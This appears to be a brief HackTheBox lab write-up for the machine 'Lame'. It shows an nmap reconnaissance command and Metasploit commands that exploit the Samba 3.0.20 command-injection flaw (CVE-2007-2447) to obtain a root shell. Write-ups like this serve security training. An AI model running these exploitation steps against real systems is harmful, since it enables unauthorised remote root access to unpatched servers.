## Overview

**Machine:** Lame  
**Platform:** HackTheBox  
**Difficulty:** Easy  
**OS:** Linux  
**CVE:** CVE-2007-2447

Lame is one of the first machines on HackTheBox. It demonstrates a classic Samba vulnerability
that allows unauthenticated remote code execution.

---

## Reconnaissance

Started with an `nmap` scan to identify open ports and services:

```bash
nmap -sV -sC -oN lame.nmap 10.10.10.3
```

Results showed the following ports open:

- **21** — FTP (vsftpd 2.3.4)
- **22** — SSH (OpenSSH 4.7p1)
- **139/445** — Samba 3.0.20

---

## Exploitation

The Samba version `3.0.20` is vulnerable to **CVE-2007-2447**, which allows command injection
via the `username` field in the MS-RPC calls.

Used Metasploit to exploit:

```bash
msfconsole
use exploit/multi/samba/usermap_script
set RHOSTS 10.10.10.3
set LHOST YOUR_IP
run
```

Got a root shell immediately.
